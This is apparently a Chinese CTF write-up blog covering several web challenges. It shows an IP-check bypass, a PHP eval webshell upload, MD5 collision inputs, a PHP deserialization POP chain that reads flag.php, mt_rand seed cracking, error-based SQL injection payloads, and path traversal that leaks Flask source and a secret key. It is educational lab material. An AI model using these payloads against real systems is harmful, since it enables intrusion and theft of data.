<p><img src="image-20201029175921389.png" alt="image-20201029175921389"></p>
<p>读取到源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">$v</span>)</span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents($_GET[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>其中对IP进行了一次check，XFF不可用，用Clinet-IP即可绕过</p>
<p><img src="image-20201029180308506.png" alt="image-20201029180308506"></p>
<p>之后看上面的简单函数的逆向，把加号改成减号就行了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$v = <span class="string">&quot;fj]a&amp;f\b&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unchange</span>(<span class="params">$v</span>)</span>&#123;</span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params">$v</span>)</span>&#123;</span><br><span class="line">    $v = base64_decode($v);</span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $re;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> (change(<span class="string">&quot;ZmpdYSZmXGI=&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>比较恶心到人的是2333的输出，我之前无论如何输入都不行，一度怀疑人生，最后找到data的伪协议可以绕过，参考文章：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;nzjdsds&#x2F;article&#x2F;details&#x2F;82461043</span><br></pre></td></tr></table></figure>

<p>最后成功拿到flag，flag在源码中：</p>
<p><img src="image-20201029180627670.png" alt="image-20201029180627670"></p>
<h1 id="2-你传你🐎呢"><a href="#2-你传你🐎呢" class="headerlink" title="2.你传你🐎呢"></a>2.你传你🐎呢</h1><p>分别上传.htaccess和一句话即可：</p>
<p><img src="image-20201029182056361.png" alt="image-20201029182056361"></p>
<p>一句话用asp的格式：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>($_POST[<span class="number">1</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="image-20201029182147837.png" alt="image-20201029182147837"></p>
<p>之后用蚁剑🔗拿flag即可，这道题我比较奇怪的就是过滤了很多东西，但是又没啥用,我猜测是出题人过滤不够？不然可以用disable_function的来做的,过滤如下：k’h’j</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld	</span><br></pre></td></tr></table></figure>

<h1 id="3-Ez-bypass"><a href="#3-Ez-bypass" class="headerlink" title="3.Ez_bypass"></a>3.Ez_bypass</h1><p>MD5强等于绕过和弱等于绕过：</p>
<p><img src="image-20201029190823452.png" alt="image-20201029190823452"></p>
<p>当然也可以用下面这两组数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hexString1 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&#x27;</span></span><br><span class="line">hexString2 = <span class="string">&#x27;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> = M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">00</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1U%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br><span class="line"><span class="number">2</span> = M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">02</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1%D5%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br></pre></td></tr></table></figure>





<p>第二步；</p>
<p><img src="image-20201029190903989.png" alt="image-20201029190903989"></p>
<h1 id="4-PYWebsite"><a href="#4-PYWebsite" class="headerlink" title="4.PYWebsite"></a>4.PYWebsite</h1><p><img src="image-20201029190958345.png" alt="image-20201029190958345"></p>
<p>看到这句话，直接伪造XFF即可</p>
<p><img src="image-20201029191040967.png" alt="image-20201029191040967"></p>
<h1 id="5-Ezpop"><a href="#5-Ezpop" class="headerlink" title="5.Ezpop"></a>5.Ezpop</h1><p>首先审计源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>我自己审计的时候感觉有点懵，首先我们可能要用到的是include这么一个函数，而var函数会在__invoke的时候去调用$var，进行文件包含，于是我们构造如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$var=<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>接着就是去找哪里可以调用到这么一个__invoke方法了，根据PHP的手册，我们会在 函数被当成方法调用的时候自动调用，例子如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$mod = <span class="keyword">new</span> Modifier();</span><br><span class="line">$mod();</span><br><span class="line"><span class="comment">//在下面则会自动调用invoke方法</span></span><br></pre></td></tr></table></figure>



<p>往下看就能看见Test方法，因为它返回了一个function。所以让Test去get 一下Modifier类，就会先调用__get方法，结果因为被当成了函数进行调用，我们的Modifier类自动的调用了invoke方法。</p>
<p>然后我卡在这里好久..最后看了师傅们的博客才想到该怎么写..说实话还是有点懵逼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在show函数当中，我们需要找到__wakeup函数，因为它进行了echo操作，此时便会触发string函数</p>
<p>修改source的值。</p>
<p>最后要注意protected属性修饰的变量应该用urlencode进行修饰避免不可见字符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var=<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line"><span class="comment">//    private $c;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span>&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = <span class="keyword">new</span> Test();</span><br><span class="line">$mod = <span class="keyword">new</span> Modifier();</span><br><span class="line">$show1 = <span class="keyword">new</span> Show();</span><br><span class="line">$show1 -&gt;str =$test;</span><br><span class="line">$show1-&gt;str-&gt;p = $mod;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$show2 = <span class="keyword">new</span> Show($show1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($show2));</span><br><span class="line"><span class="comment">//当我们触发</span></span><br></pre></td></tr></table></figure>



<p>这里就是进行了一个套娃，当反序列化的时候呢，show方法被反序列化，调用了wakeup的函数，之后又因为</p>
<p>__construct,进行了一句输出，所以就造成了toString调用，在此之前我们构造好语句即可</p>
<p>$show2 纯粹的是进行一次wakeup调用！</p>
<p><img src="image-20201029191526057.png" alt="image-20201029191526057"></p>
<h1 id="6-Ezadult"><a href="#6-Ezadult" class="headerlink" title="6.Ezadult"></a>6.Ezadult</h1><p>页面啥也看不出来，直接<a href="http://www.zip下了一波代码，之后发现是伪随机数爆破，构造两个脚本：">www.zip下了一波代码，之后发现是伪随机数爆破，构造两个脚本：</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line">str2 = <span class="string">&#x27;KVQP0LdJKRaV3n9D&#x27;</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res += <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(str1) - <span class="number">1</span>) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#结果 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>下载php_mt_rand那个脚本，使用教程：</p>
<p>记得用make编译c语言的东西，之后./运行即可：</p>
<p><img src="image-20201029203700811.png" alt="image-20201029203700811"></p>
<p>跑出公钥来：1775196155</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"><span class="comment">//公钥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span>(<span class="params">$length = <span class="number">16</span></span>) </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//私钥</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span>(<span class="params">$length = <span class="number">12</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> public_key();</span><br><span class="line"><span class="keyword">echo</span> private_key();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>之后密码用万能密码一过，即可得到flag</p>
<p>后面的两个一个太难一个是题目down掉了完全用不了。。</p>
]]></content>
  </entry>
  <entry>
    <title>N1BOOK</title>
    <url>/2020/12/03/N1BOOK/</url>
    <content><![CDATA[<h1 id="1-4没啥好说的"><a href="#1-4没啥好说的" class="headerlink" title="1-4没啥好说的"></a>1-4没啥好说的</h1><h1 id="arf-2"><a href="#arf-2" class="headerlink" title="arf_2"></a>arf_2</h1><p>利用nginx的解析错误</p>
<h1 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h1><p>一个报错注入</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin&#x27; and  extractvalue(0x0a,concat(0x0a,(<span class="keyword">sELect</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()  ))) <span class="comment"># </span></span><br></pre></td></tr></table></figure>



<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin&#x27; and  extractvalue(0x0a,concat(0x0a,(<span class="keyword">sELect</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;fl4g&#x27;</span>  ))) <span class="comment"># </span></span><br></pre></td></tr></table></figure>



<h1 id="afr-3"><a href="#afr-3" class="headerlink" title="afr_3"></a>afr_3</h1><p>不会了，学习了。</p>
<p>当我们读取文件的时候，可以通过读取proc/self/cmdline目录来查看系统执行了什么命令</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">/proc/cmdline </span><br><span class="line">在启动时传递至内核的相关参数信息，这些信息通常由lilo或grub等启动管理工具进行传递； </span><br><span class="line"></span><br><span class="line">[root@rhel5 ~]# more /proc/cmdline </span><br><span class="line">ro root=/dev/VolGroup00/LogVol00 rhgb quiet </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="image-20201203143634984.png" alt="image-20201203143634984"></p>
<p>在这里就能看见server.py了，于是再去proc/self/cwd目录下读取这个文件</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">cwd — 指向当前进程运行目录的一个符号链接； </span><br></pre></td></tr></table></figure>

<p>也就是说cwd下可以连接到所有当前正在启动的进程的工作目录</p>
<p>于是构造：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;3a7463f9-513b-4f61-a0d1-b5ce36abfa59.node3.buuoj.cn&#x2F;article?name&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;proc&#x2F;self&#x2F;cwd&#x2F;server.py</span><br></pre></td></tr></table></figure>

<p>得到源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> ( Flask, render_template, request, url_for, redirect, session, render_template_string )</span><br><span class="line"><span class="keyword">from</span> flask_session <span class="keyword">import</span> Session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">execfile(<span class="string">&#x27;flag.py&#x27;</span>)</span><br><span class="line">execfile(<span class="string">&#x27;key.py&#x27;</span>)</span><br><span class="line"></span><br><span class="line">FLAG = flag</span><br><span class="line">app.secret_key = key</span><br><span class="line"><span class="meta">@app.route(&quot;/n1page&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n1page</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method != <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line">    n1code = request.form.get(<span class="string">&quot;n1code&quot;</span>) <span class="keyword">or</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> n1code <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        n1code = n1code.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;n1code&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> session <span class="keyword">or</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        session[<span class="string">&#x27;n1code&#x27;</span>] = n1code</span><br><span class="line">    template = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;n1code&#x27;</span>] <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        template = <span class="string">&#x27;&#x27;&#x27;&lt;h1&gt;N1 Page&lt;/h1&gt; &lt;div class=&quot;row&gt; &lt;div class=&quot;col-md-6 col-md-offset-3 center&quot;&gt; Hello : %s, why you don&#x27;t look at our &lt;a href=&#x27;/article?name=article&#x27;&gt;article&lt;/a&gt;? &lt;/div&gt; &lt;/div&gt; &#x27;&#x27;&#x27;</span> % session[<span class="string">&#x27;n1code&#x27;</span>]</span><br><span class="line">        session[<span class="string">&#x27;n1code&#x27;</span>] = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;main.html&quot;</span>)</span><br><span class="line"><span class="meta">@app.route(&#x27;/article&#x27;, methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">article</span>():</span></span><br><span class="line">    error = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> request.args:</span><br><span class="line">        page = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="string">&#x27;article&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> page.find(<span class="string">&#x27;flag&#x27;</span>)&gt;=<span class="number">0</span>:</span><br><span class="line">        page = <span class="string">&#x27;notallowed.txt&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        template = <span class="built_in">open</span>(<span class="string">&#x27;/home/nu11111111l/articles/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(page)).read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        template = e</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;article.html&#x27;</span>, template=template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>

<p>看见flag被过滤了，读一下key.py</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Drmhze6EPcv0fN_81Bj-nA</span><br></pre></td></tr></table></figure>

<p>猛测了一波</p>
